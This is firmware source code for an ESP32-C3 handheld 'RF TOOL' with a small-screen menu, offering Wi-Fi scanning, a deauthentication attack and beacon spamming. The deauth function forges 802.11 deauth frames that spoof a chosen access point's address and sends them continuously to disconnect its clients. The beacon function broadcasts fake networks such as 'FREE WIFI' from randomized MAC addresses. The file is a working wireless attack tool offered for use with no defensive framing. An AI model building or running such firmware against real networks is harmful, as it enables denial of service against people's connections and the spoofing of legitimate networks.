/*
 * RF TOOL v5.0 - Wi-Fi Only (Bruce Style UI)
 * ESP32-C3 Supermini
 * 
 * Features:
 * - Wi-Fi Scanner
 * - Deauth Attack
 * - Beacon Spammer
 * 
 * Pinout:
 * TFT:   CS=5, DC=6, RST=7, SCK=8, MOSI=10, LED=3.3V
 * Buttons: UP=1, DOWN=20, SEL=3, BACK=0
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни ======================
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8

#define BTN_UP      1
#define BTN_DOWN    20
#define BTN_SEL     3
#define BTN_BACK    0

// ====================== Кольори (Bruce palette) ======================
#define BG_COLOR        ST77XX_BLACK
#define HEADER_COLOR    ST77XX_CYAN
#define SELECTED_COLOR  ST77XX_YELLOW
#define TEXT_COLOR      ST77XX_WHITE
#define ALERT_COLOR     ST77XX_RED
#define SUCCESS_COLOR   ST77XX_GREEN
#define LINE_COLOR      ST77XX_BLUE

// ====================== Об'єкти ======================
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ====================== Стани меню ======================
enum AppState {
  MAIN_MENU,
  WIFI_SCAN,
  WIFI_DEAUTH,
  WIFI_BEACON,
  SETTINGS
};

AppState currentState = MAIN_MENU;

// Головне меню
const char* mainMenuItems[] = {"Wi-Fi Scan", "Deauth", "Beacon Spam", "Settings"};
const uint8_t mainMenuSize = 4;
int8_t mainMenuIndex = 0;

// Налаштування
const char* beaconNames[] = {"Default", "Custom 1", "Custom 2"};
const uint8_t beaconCount = 3;
uint8_t beaconIndex = 0;
bool randomMAC = true;

// Wi-Fi дані
int apCount = 0;
String apList[30];
uint8_t apBSSID[30][6];
int apChannel[30];
int selectedAP = 0;

// Стани атак
bool deauthActive = false;
bool beaconActive = false;
unsigned long lastPacket = 0;
unsigned long packetCount = 0;

// ====================== Прототипи функцій ======================
void drawHeader(const char* title);
void drawMainMenu();
void drawWiFiScanList();
void drawWiFiDeauthScreen();
void drawBeaconScreen();
void drawSettingsScreen();
void drawButtonHints(const char* hints);
void handleNavigation();
void startWiFiScan();
void startDeauth();
void stopDeauth();
void startBeacon();
void stopBeacon();
void sendBeaconPacket(const char* ssid);
void sendDeauthPacket(uint8_t* bssid, int channel);

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  delay(500);

  // Кнопки
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  // SPI для дисплея
  SPI.begin(TFT_SCLK, -1, TFT_MOSI);

  // Дисплей
  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(BG_COLOR);
  tft.setTextWrap(false);

  // Повідомлення про статус
  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 30);
  tft.print("TFT OK!");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 50);
  tft.print("Wi-Fi init...");

  // Wi-Fi
  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 70);
  tft.print("Ready!");

  delay(1000);
  drawMainMenu();
}

// ====================== Головний цикл ======================
void loop() {
  handleNavigation();

  // Deauth attack
  if (currentState == WIFI_DEAUTH && deauthActive) {
    if (millis() - lastPacket >= 20) {
      lastPacket = millis();
      sendDeauthPacket(apBSSID[selectedAP], apChannel[selectedAP]);
      packetCount++;
      
      // Оновлення лічильника на екрані
      tft.fillRect(10, 80, 140, 20, BG_COLOR);
      tft.setCursor(10, 80);
      tft.setTextColor(TEXT_COLOR);
      tft.print("Packets: ");
      tft.print(packetCount);
    }
  }

  // Beacon spam
  if (currentState == WIFI_BEACON && beaconActive) {
    if (millis() - lastPacket >= 100) {
      lastPacket = millis();
      
      String ssid;
      if (beaconIndex == 0) {
        ssid = "FREE WIFI";
      } else if (beaconIndex == 1) {
        ssid = "AndroidAP_" + String(random(1000, 9999));
      } else {
        ssid = "iPhone (" + String(random(1, 99)) + ")";
      }
      
      sendBeaconPacket(ssid.c_str());
      packetCount++;
      
      // Оновлення на екрані
      tft.fillRect(10, 80, 140, 40, BG_COLOR);
      tft.setCursor(10, 80);
      tft.setTextColor(TEXT_COLOR);
      tft.print("SSID: ");
      tft.print(ssid.substring(0, 12));
      tft.setCursor(10, 95);
      tft.print("Packets: ");
      tft.print(packetCount);
    }
  }

  delay(10);
}

// ====================== Функції малювання ======================
void drawHeader(const char* title) {
  tft.fillRect(0, 0, 160, 20, HEADER_COLOR);
  tft.setTextColor(BG_COLOR);
  tft.setTextSize(1);
  tft.setCursor(5, 6);
  tft.print(title);
  tft.drawFastHLine(0, 20, 160, LINE_COLOR);
}

void drawButtonHints(const char* hints) {
  tft.fillRect(0, 140, 160, 20, BG_COLOR);
  tft.setTextColor(ST77XX_CYAN);
  tft.setTextSize(1);
  tft.setCursor(2, 145);
  tft.print(hints);
}

void drawMainMenu() {
  tft.fillScreen(BG_COLOR);
  drawHeader("RF TOOL v5.0");
  
  const char* icons[] = {"[S]", "[D]", "[B]", "[#]"};
  
  for (int i = 0; i < mainMenuSize; i++) {
    int y = 35 + i * 25;
    if (i == mainMenuIndex) {
      tft.fillRoundRect(5, y-2, 150, 20, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(15, y);
    tft.print(icons[i]);
    tft.setCursor(35, y);
    tft.print(mainMenuItems[i]);
  }
  
  drawButtonHints("UP/DN:nav  SEL:enter");
}

void startWiFiScan() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Wi-Fi Scanner");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Scanning...");
  
  apCount = WiFi.scanNetworks();
  if (apCount > 30) apCount = 30;
  
  for (int i = 0; i < apCount; i++) {
    apList[i] = WiFi.SSID(i);
    if (apList[i].length() == 0) apList[i] = "[Hidden]";
    apChannel[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
  
  drawWiFiScanList();
}

void drawWiFiScanList() {
  tft.fillScreen(BG_COLOR);
  drawHeader("AP List");
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 40);
    tft.print("No networks found");
    drawButtonHints("BACK:return");
    return;
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 25);
  tft.print("Found: ");
  tft.print(apCount);
  
  for (int i = 0; i < apCount; i++) {
    int y = 40 + i * 12;
    if (y > 130) break;
    
    if (i == selectedAP) {
      tft.fillRect(3, y-2, 154, 11, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(5, y);
    
    String ssid = apList[i];
    if (ssid.length() > 16) ssid = ssid.substring(0, 14) + "..";
    tft.print(ssid);
    tft.print(" (");
    tft.print(apChannel[i]);
    tft.print(")");
  }
  
  drawButtonHints("UP/DN:select  SEL:attack  BACK:back");
}

void drawWiFiDeauthScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Deauth Attack");
  
  tft.setTextColor(ALERT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Target:");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 50);
  String ssid = apList[selectedAP];
  if (ssid.length() > 18) ssid = ssid.substring(0, 16) + "..";
  tft.print(ssid);
  
  tft.setCursor(10, 65);
  tft.print("Channel: ");
  tft.print(apChannel[selectedAP]);
  
  tft.setTextColor(deauthActive ? SUCCESS_COLOR : TEXT_COLOR);
  tft.setCursor(10, 85);
  tft.print(deauthActive ? "ATTACK RUNNING" : "Press SEL to start");
  
  if (deauthActive) {
    tft.setCursor(10, 100);
    tft.print("Packets: ");
    tft.print(packetCount);
  }
  
  drawButtonHints("SEL:start/stop  BACK:back");
}

void drawBeaconScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Beacon Spammer");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Mode: ");
  tft.print(beaconNames[beaconIndex]);
  
  tft.setCursor(10, 50);
  tft.print("Random MAC: ");
  tft.setTextColor(randomMAC ? SUCCESS_COLOR : ALERT_COLOR);
  tft.print(randomMAC ? "ON" : "OFF");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 70);
  tft.print("Status: ");
  if (beaconActive) {
    tft.setTextColor(SUCCESS_COLOR);
    tft.print("SPAMMING");
  } else {
    tft.setTextColor(TEXT_COLOR);
    tft.print("Idle");
  }
  
  if (beaconActive) {
    tft.setCursor(10, 90);
    tft.print("Packets: ");
    tft.print(packetCount);
  }
  
  drawButtonHints("SEL:start/stop  L/R:mode  BACK:back");
}

void drawSettingsScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Settings");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Beacon Mode:");
  
  for (int i = 0; i < beaconCount; i++) {
    int y = 55 + i * 18;
    if (i == beaconIndex) {
      tft.fillRoundRect(10, y-2, 140, 16, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(20, y);
    tft.print(beaconNames[i]);
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 115);
  tft.print("Random MAC: ");
  tft.setTextColor(randomMAC ? SUCCESS_COLOR : ALERT_COLOR);
  tft.print(randomMAC ? "ON" : "OFF");
  
  drawButtonHints("UP/DN:change  SEL:toggle  BACK:back");
}

// ====================== Функції атак ======================
void startDeauth() {
  deauthActive = true;
  packetCount = 0;
  esp_wifi_set_channel(apChannel[selectedAP], WIFI_SECOND_CHAN_NONE);
  drawWiFiDeauthScreen();
}

void stopDeauth() {
  deauthActive = false;
  drawWiFiDeauthScreen();
}

void startBeacon() {
  beaconActive = true;
  packetCount = 0;
  drawBeaconScreen();
}

void stopBeacon() {
  beaconActive = false;
  drawBeaconScreen();
}

void sendDeauthPacket(uint8_t* bssid, int channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void sendBeaconPacket(const char* ssid) {
  uint8_t packet[128];
  int ssidLen = strlen(ssid);
  
  // Beacon frame header
  packet[0] = 0x80;  // Type: Beacon
  packet[1] = 0x00;  // Flags
  packet[2] = 0x00;  // Duration
  packet[3] = 0x00;
  
  // Destination (broadcast)
  for (int i = 4; i < 10; i++) packet[i] = 0xFF;
  
  // Source (random MAC if enabled)
  if (randomMAC) {
    for (int i = 10; i < 16; i++) packet[i] = random(0, 255);
    packet[10] &= 0xFE; // Unicast
  } else {
    // Use ESP MAC
    esp_read_mac(packet + 10, ESP_MAC_WIFI_STA);
  }
  
  // BSSID (same as source)
  memcpy(packet + 16, packet + 10, 6);
  
  // Sequence control
  packet[22] = random(0, 255);
  packet[23] = random(0, 255);
  
  // Beacon body
  int pos = 24;
  
  // Timestamp
  for (int i = 0; i < 8; i++) packet[pos++] = random(0, 255);
  
  // Beacon interval
  packet[pos++] = 0x64;
  packet[pos++] = 0x00;
  
  // Capability info
  packet[pos++] = 0x21;
  packet[pos++] = 0x04;
  
  // SSID tag
  packet[pos++] = 0x00;
  packet[pos++] = ssidLen;
  memcpy(packet + pos, ssid, ssidLen);
  pos += ssidLen;
  
  // Supported rates
  packet[pos++] = 0x01;
  packet[pos++] = 0x08;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8B;
  packet[pos++] = 0x96;
  packet[pos++] = 0x24;
  packet[pos++] = 0x30;
  packet[pos++] = 0x48;
  packet[pos++] = 0x6C;
  
  // DS Parameter set (channel 1)
  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = 0x01;
  
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ====================== Навігація ======================
void handleNavigation() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 180) return;
  
  bool up   = digitalRead(BTN_UP) == LOW;
  bool down = digitalRead(BTN_DOWN) == LOW;
  bool sel  = digitalRead(BTN_SEL) == LOW;
  bool back = digitalRead(BTN_BACK) == LOW;
  
  if (!up && !down && !sel && !back) return;
  lastPress = millis();
  
  // BACK
  if (back) {
    if (currentState == MAIN_MENU) return;
    
    if (deauthActive) stopDeauth();
    if (beaconActive) stopBeacon();
    
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  
  // Обробка станів
  switch (currentState) {
    case MAIN_MENU:
      if (up)   mainMenuIndex = (mainMenuIndex - 1 + mainMenuSize) % mainMenuSize;
      if (down) mainMenuIndex = (mainMenuIndex + 1) % mainMenuSize;
      if (up || down) drawMainMenu();
      
      if (sel) {
        switch (mainMenuIndex) {
          case 0:
            startWiFiScan();
            currentState = WIFI_SCAN;
            break;
          case 1:
            if (apCount == 0) startWiFiScan();
            currentState = WIFI_DEAUTH;
            drawWiFiDeauthScreen();
            break;
          case 2:
            currentState = WIFI_BEACON;
            drawBeaconScreen();
            break;
          case 3:
            currentState = SETTINGS;
            drawSettingsScreen();
            break;
        }
      }
      break;
      
    case WIFI_SCAN:
      if (apCount == 0) break;
      if (up)   selectedAP = (selectedAP - 1 + apCount) % apCount;
      if (down) selectedAP = (selectedAP + 1) % apCount;
      if (up || down) drawWiFiScanList();
      
      if (sel) {
        currentState = WIFI_DEAUTH;
        drawWiFiDeauthScreen();
      }
      break;
      
    case WIFI_DEAUTH:
      if (sel) {
        if (deauthActive) stopDeauth();
        else startDeauth();
      }
      break;
      
    case WIFI_BEACON:
      if (up)   { beaconIndex = (beaconIndex - 1 + beaconCount) % beaconCount; drawBeaconScreen(); }
      if (down) { beaconIndex = (beaconIndex + 1) % beaconCount; drawBeaconScreen(); }
      if (sel) {
        if (beaconActive) stopBeacon();
        else startBeacon();
      }
      break;
      
    case SETTINGS:
      if (up)   { beaconIndex = (beaconIndex - 1 + beaconCount) % beaconCount; drawSettingsScreen(); }
      if (down) { beaconIndex = (beaconIndex + 1) % beaconCount; drawSettingsScreen(); }
      if (sel) {
        randomMAC = !randomMAC;
        drawSettingsScreen();
      }
      break;
  }
}